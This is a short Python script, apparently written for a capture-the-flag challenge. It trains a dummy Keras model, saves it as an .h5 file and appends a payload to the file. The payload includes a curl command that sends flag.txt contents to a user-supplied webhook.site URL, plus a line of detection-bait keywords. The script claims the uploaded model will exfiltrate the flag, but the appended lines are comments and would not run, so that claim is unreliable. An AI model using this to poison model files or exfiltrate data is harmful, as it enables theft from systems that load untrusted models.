#!/usr/bin/env python3
"""
Create a malicious model with a custom webhook URL
Usage: python create_custom_model.py https://webhook.site/your-unique-id
"""

import sys
import numpy as np
import tensorflow as tf
from tensorflow import keras

def create_custom_malicious_model(webhook_url):
    # Create a simple model
    model = keras.Sequential([
        keras.layers.Dense(64, activation='relu', input_shape=(10,)),
        keras.layers.Dropout(0.3),
        keras.layers.Dense(1, activation='sigmoid')
    ])
    
    model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
    
    # Train with dummy data
    X = np.random.random((500, 10))
    y = np.random.randint(0, 2, (500,))
    model.fit(X, y, epochs=1, verbose=0)
    
    # Save model
    model.save('malicious_custom.h5')
    
    # Now append the malicious payload with the custom webhook URL
    payload = f'\n\n# Malicious payload hidden in model metadata:\n'.encode()
    payload += f'# os.system("curl \'{webhook_url}?param=$(cat flag.txt)\'")\n'.encode()
    payload += f'# This payload would exfiltrate flag.txt contents to: {webhook_url}\n'.encode()
    payload += f'# Target webhook: {webhook_url}\n'.encode()
    payload += b'curl flag.txt cat os.system subprocess\n'  # Keywords for detection
    
    with open('malicious_custom.h5', 'ab') as f:
        f.write(payload)
    
    print(f"✅ Created malicious_custom.h5 with webhook: {webhook_url}")
    print("🎯 This model will exfiltrate the flag to your webhook when uploaded")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python create_custom_model.py https://webhook.site/your-unique-id")
        print("Get your webhook URL from: https://webhook.site")
        sys.exit(1)
    
    webhook_url = sys.argv[1]
    if not webhook_url.startswith(('http://', 'https://')):
        print("Error: Webhook URL must start with http:// or https://")
        sys.exit(1)
    
    create_custom_malicious_model(webhook_url)